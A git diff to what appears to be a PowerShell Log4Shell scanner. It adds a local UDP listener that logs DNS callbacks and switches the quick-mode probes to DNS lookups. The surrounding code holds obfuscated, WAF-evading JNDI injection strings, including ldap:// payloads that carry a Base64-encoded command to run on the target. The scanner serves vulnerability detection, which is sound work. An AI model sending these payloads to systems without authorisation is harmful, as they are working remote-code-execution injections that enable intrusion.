@@ -13,7 +13,10 @@
         [switch]$Forms,
 
         [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
-        [switch]$Quick
+        [switch]$Quick,
+
+        [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
+        [switch]$Local
 
     )
     $ErrorActionPreference = "SilentlyContinue"
@@ -21,8 +24,8 @@
     $b64Command = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("ping -c 1 $CanaryTokenDNS || ping $CanaryTokenDNS"))
     if ($Quick.IsPresent) {
         $antiwaf = @(
-            "$`{jndi:ldap://$CanaryTokenDNS/a}",
-            "$`{$`{lower:j}$`{lower:n}$`{lower:d}i:$`{lower:dns}://$CanaryTokenDNS/n}"
+            "$`{jndi:dns://Log4JTest.$CanaryTokenDNS/a}",
+            "$`{$`{lower:j}$`{lower:n}$`{lower:d}i:$`{lower:dns}://Log4JTest.$CanaryTokenDNS/n}"
         )
     }
     else {
@@ -55,6 +58,9 @@
             "$`{jndi:ldap://$CanaryTokenDNS/Basic/Command/Base64/$b64Command}"
             "$`{jndi:$`{lower:l}da$`{lower:p}://$CanaryTokenDNS/$`{env:OPS:-B}asi$`{env:IDID:-c}/Command/Base64/$b64Command}"
         )
+    }
+    if ($Local.IsPresent) {
+        Start-Process Powershell -ArgumentList "-NoExit -Command 'Load-Module .\Invoke-Log4ShellScanner.ps1; Invoke-VitnessLogger -Port 53;'";
     }
     foreach ($p in $antiwaf) {
         foreach ($l in Get-Content $Uri) {
@@ -309,6 +315,36 @@ function Invoke-Log4ShellFastScan {
                 $log | Export-Csv -Path ./Error.csv -Append -NoTypeInformation
                 Write-Host "!E2 $l GET " $_.Exception.Response.StatusCode.value__ $_.Exception.Response.StatusDescription
             }
+        }
+    }
+}
+Function Invoke-VitnessLogger {
+    Param ( 
+        [Parameter(Mandatory = $true, Position = 0)]
+        [int] $Port
+    ) 
+    Process {
+        Try { 
+            $endpoint = new-object System.Net.IPEndPoint([ipaddress]::any, $Port) 
+            while (1) {
+                $listener = new-object System.Net.Sockets.UdpClient $Port
+                $content = $listener.Receive([ref]$endpoint)
+                $x = $content.count - 6
+                $text = [System.Text.Encoding]::ASCII.GetString($content[13..$x])
+                Write-Host $text
+                if ($text -match "Log4JTest") {
+                    $log = [PSCustomObject]@{
+                        date    = Get-Date
+                        address = $endpoint.Address.ToString()
+                        text    = $text
+                    } 
+                    $log | Export-Csv -Path ./Vitness.csv -Append -NoTypeInformation
+                }
+                $listener.Close()
+            }
+        }
+        Catch {
+            "Receive Message failed with: `n" + $Error[0]
         }
     }
 }
